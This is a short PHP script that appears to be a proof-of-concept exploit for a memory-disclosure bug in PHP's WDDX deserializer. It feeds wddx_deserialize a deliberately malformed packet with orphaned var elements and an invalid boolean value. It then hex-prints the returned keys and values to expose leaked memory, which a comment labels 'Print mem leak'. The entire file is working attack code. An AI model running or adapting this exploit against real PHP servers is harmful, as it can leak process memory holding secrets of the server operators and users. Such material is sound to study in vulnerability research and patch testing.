<?php

$xml = <<<EOF
<?xml version='1.0' ?>
<!DOCTYPE wddxPacket SYSTEM 'wddx_0100.dtd'>
<wddxPacket version='1.0'>
    <array>
         <var name='ML'></var>
            <string>manhluat</string>
         <var name='ML2'></var>
         	<boolean value='a'/>
         <boolean value='true'/>
    </array>
</wddxPacket>
EOF;

$wddx = wddx_deserialize($xml);
var_dump($wddx);
// Print mem leak
foreach($wddx as $k=>$v)
	printf("Key: %s\nValue: %s\n",bin2hex($k),bin2hex($v));

?>
